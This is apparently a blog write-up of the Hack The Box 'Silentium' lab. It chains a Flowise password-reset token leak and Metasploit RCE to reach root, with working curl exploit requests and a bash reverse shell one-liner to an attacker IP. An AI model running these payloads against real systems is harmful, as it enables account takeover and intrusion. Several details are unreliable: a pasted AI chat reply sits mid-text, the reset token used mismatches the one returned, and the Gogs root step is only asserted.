---
title: 'Silentium - Hack The Box Writeup (Linux, Medium)'
description: 'Silentium HTB Machine Writeup : full exploitation chain from initial access to root via Flowise RCE and Gogs symlink abuse'
date: 2026-04-26T11:03:45+01:00
tags: ['HTB', 'Linux', 'Writeup', 'Medium', 'RCE', 'Gogs', 'Flowise']
authors: ['mensi']
image: ../assets/htb/silentium/1.png
draft: false
maths: true
---

# Silentium - Hack The Box Writeup

Silentium was one of those machines that looks simple at first (just 80 and 22), but slowly turns into a chain of _“wait… this is also vulnerable?”_ moments.

It ended up being a mix of:

- Flowise authentication issues (CVE-based)
- Custom MCP JavaScript injection (CVE-2025-59528)
- Credential leakage from environment variables
- Gogs local service exploitation for root

And yes… there was a moment where I tried about 12 reverse shells before realizing `/bin/bash` was basically on vacation.

---

## 1. Enumeration

The first step was a full scan:

```bash
nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.39.130
```

Nmap showed only two services:

```bash
┌──(mensi㉿kali)-[~/Desktop]
└─$ nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.39.130
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 06:12 -0400
Nmap scan report for 10.129.39.130
Host is up (0.076s latency).
Not shown: 55688 closed tcp ports (reset), 9845 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.79 seconds

┌──(mensi㉿kali)-[~/Desktop]
└─$



```

Nothing special at first glance… the classic “HTB calm before disaster”.

---

## 2. Subdomain Discovery

I fuzzed virtual hosts:

```bash
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
```

Result:

```bash

┌──(mensi㉿kali)-[~/Desktop]
└─$ ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 111ms]
:: Progress: [4989/4989] :: Job [1/1] :: 402 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

┌──(mensi㉿kali)-[~/Desktop]
└─$

```

- `staging.silentium.htb`

This is where things started getting interesting.

---

## 3. Identifying Flowise

The staging site was running **Flowise**.

![Alt text](../assets/htb/silentium/2.png)

At this point, my first thought wasn’t exploitation, it was just figuring out how to get inside.

> “Alright… this is probably just a signup/login flow. Let me find a way to authenticate first.”

---

<style>
.critical {
    
                display: inline-block;
                outline: 0;
                cursor: pointer;
                border-radius: 999px;
                border: 2px solid #ff4742;
                color: #ff4742;
                background: 0 0;
                padding: 8px;
                box-shadow: rgba(0, 0, 0, 0.07) 0px 2px 4px 0px, rgba(0, 0, 0, 0.05) 0px 1px 1.5px 0px;
                font-weight: 800;
                font-size: 10px;
                height: 30px;
                
                
}

</style>

## 4. CVE #1 : Flowise Password Reset Logic (CVE-2025-58434 <span class="critical">Critical</span> )

While inspecting Flowise, I found a known security issue affecting password reset logic.

🔗 [https://github.com/advisories/GHSA-wgpv-6j63-x5ph](https://github.com/advisories/GHSA-wgpv-6j63-x5ph)

The API endpoint:

```
/api/v1/account/forgot-password
```

leaks a **temporary reset token** when combined with an internal header:

```bash
x-request-from: internal
```

Of course, this CVE still needs **a real registered email**.

At first I didn’t know any Flowise users, so I went back to the main website `silentium.htb` and checked the **Team / Leadership** section:

```
http://silentium.htb/#team
```

The company literally listed employee names like:

- Marcus Thorne
- Elena Rossi
- **Ben**

And since Flowise login placeholders usually follow the classic format:

```
user@company.com
```

I made the obvious guess:

`ben@silentium.htb`

Then I tested it against the forgot-password endpoint.

If the email is valid, Flowise responds differently (and even leaks a token).
If not, it returns `"Invalid User Email"`.

So this was basically:

> “Thanks for the employee directory… I’ll take it from here.”

So I triggered:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

### Result

Boom! reset token returned.

```bash

┌──(mensi㉿kali)-[~/Desktop]
└─$ curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$nQz8sDzUf6EWRG3oW5TW9uPoBXLqPtcI7GoclN5K42wITyxDdDTge","tempToken":"glgeRkFCaFWRGpdLyQ8PJ1Sl9S3jGXdtfATjM8jhg8tyL2pOdHV4V7oBmzRztgnW","tokenExpiry":"2026-04-26T15:55:20.018Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-26T15:40:20.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
┌──(mensi㉿kali)-[~/Desktop]
└─$
```

After triggering the forgot-password endpoint, the application returned a **temporary reset token** (`tempToken`) tied to the user session:

```json
"tempToken": "glgeRkFCaFWRGpdLyQ8PJ1Sl9S3jGXdtfATjM8jhg8tyL2pOdHV4V7oBmzRztgnW"
```

This token is the missing piece required to complete the password reset flow.

I then used it against the reset-password endpoint:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "user":{
      "email":"ben@silentium.htb",
      "tempToken":"eXGKMn3DsLwQqLT7NYVFo9MuFdVmxnXBQfW3OtUpIuMSTV8rjxmmSUshU2cjPmAy",
      "password":"Flowise-Fucked-UP123!"
    }
  }'
```

### Result

```bash

┌──(mensi㉿kali)-[~/Desktop]
└─$ curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "user":{
      "email":"ben@silentium.htb",
      "tempToken":"eXGKMn3DsLwQqLT7NYVFo9MuFdVmxnXBQfW3OtUpIuMSTV8rjxmmSUshU2cjPmAy",
      "password":"Flowise-Fucked-UP123!"
    }
  }'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$ToiMYgKbGdGrZcaLSQ0nveJZ1G1EPfAKAy87IZP/RsvQaF7ZOl01.","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-26T16:08:10.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
┌──(mensi㉿kali)-[~/Desktop]
└─$

```

The password was successfully updated, confirming the full exploitation of the password reset logic flaw.

At this point, I had valid credentials and i successfully logged in the Flowise instance.

![Alt text](../assets/htb/silentium/4.png)

Got it — your “dead end” should sound **real, technical, and smooth**, not comedic overload.

Here’s a cleaner rewrite that fits your writeup style:

---

## Dead End #1 — Manual RCE attempts

Before switching to a more reliable exploitation method, I initially tried leveraging the RCE techniques referenced in the official Flowise advisory:

[https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p)

The idea was to directly trigger command execution through the vulnerable node-loading mechanism using custom payloads.

I tested several variations of the provided PoC payloads, including NodeJS-based command execution and reverse shell injections:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.117/4444 0>&1'
```

However, this approach did not work reliably in this environment. The payloads either failed to execute or did not return a stable reverse shell, likely due to runtime restrictions or differences in how the staging instance was configured compared to the vulnerable reference setup.

---

## CVE #2 — CustomMCP JavaScript Injection (CVE-2025-59528)

After the manual exploitation attempts failed, I shifted to a more stable approach using **Metasploit**, since Flowise has known authenticated RCE modules available for affected versions.

From earlier enumeration, I had already confirmed the target version:

```
Flowise 3.0.5
```

This falls within the vulnerable range for:

- **CVE-2025-59528 — Flowise JS Injection / Custom MCP RCE**

---

### Finding the exploit module

I searched for available Flowise modules in Metasploit:

```bash id="msf1"
search Flowise
```

![Alt text](../assets/htb/silentium/5.png)

This returned multiple exploit modules, including:

```
exploit/multi/http/flowise_js_rce
exploit/multi/http/flowise_custommcp_rce
```

I selected the JS RCE module:

```bash id="msf2"
use exploit/multi/http/flowise_js_rce
```

### Configuring the exploit

Since this is an **authenticated RCE**, valid credentials were required.

![Alt text](../assets/htb/silentium/6.png)

From the previous password reset exploitation (CVE-2025-58434), I already had:

- Email: `ben@silentium.htb`
- Password: `Flowise-Fucked-UP123!`

I configured the module accordingly:

```bash id="msf3"
set RHOSTS 10.129.39.130
set VHOST staging.silentium.htb
set RPORT 80
set FLOWISE_EMAIL ben@silentium.htb
set FLOWISE_PASSWORD Flowise-Fucked-UP123!
set LHOST 10.10.15.117
set LPORT 4444
```

![Alt text](../assets/htb/silentium/7.png)

### Exploitation

I started a listener and executed the module:

```bash id="msf4"
run
```

Metasploit successfully:

- Authenticated to Flowise
- Detected vulnerable version (3.0.5)
- Injected the payload via the JS execution vector
- Spawned a reverse shell

```
[*] Authentication successful
[*] Sending stage ...
[*] Meterpreter session opened
```

### Result — Initial shell access

I upgraded the session to a system shell:

```bash id="msf5"
shell
whoami
```

Output:

```
root
```

![Alt text](../assets/htb/silentium/8.png)

At this point, I had **immediate root access**, however I quickly realized I was inside a **containerized environment**, not the host system.

---

## Container Enumeration

Inside the container:

- I was root (always a suspicious blessing)
- environment variables contained secrets

Key discovery:

```bash
FLOWISE_PASSWORD=F1l3_d0ck3r
```

At this point I stopped, looked at my terminal, and said:

> “So we did all this… and the password was just chilling in env vars.”

Classic.

---

## SSH Access (Host Pivot)

Using the leaked credentials:

```bash
ssh ben@10.129.39.130
```

We got host access as `ben`.

User flag:

```bash
cat user.txt
```

---

## Local Service Discovery

On the host, I discovered a local service:

```
127.0.0.1:3001
```

I forwarded it:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.39.130
```

WhatWeb revealed:

> Gogs (Git service)

---

## CVE #3 — Gogs Symlink / Repo Abuse → Root

This part was the final escalation.

A vulnerable Gogs setup allowed:

- repository manipulation
- symlink abuse
- file overwrite in internal paths

Using a crafted exploit, I triggered a malicious repository push.

Result:

```bash
root
```

No privilege escalation chain.
No fancy bypass.
Just “Git but evil”.

---

## Root Flag

```bash
cat /root/root.txt
```

Done.

---

## Final Thoughts

Silentium was a chain of “small mistakes that become big problems”:

### CVEs used:

- **CVE-2025-58434** → Flowise password reset token leak
- **CVE-2025-59528** → CustomMCP JavaScript injection → RCE

### Attack flow:

1. Subdomain discovery → staging Flowise
2. Password reset abuse → account takeover
3. CustomMCP injection → container RCE
4. Environment leakage → SSH credentials
5. Local service discovery → Gogs
6. Symlink exploit → root

---

## Dead End Summary

I lost time on:

- reverse shells that didn’t exist
- payloads assuming bash was installed
- overcomplicating the container escape

Meanwhile the machine was basically saying:

> “bro just read the environment variables”

---

## Conclusion

This box was a good reminder that:

- modern web apps = logic bugs + injection + misconfig
- containers = often just credential storage with extra steps
- Git services = quietly terrifying when misconfigured

And most importantly:

> If your reverse shell isn’t working after 10 tries… the machine is trying to tell you to stop using bash.
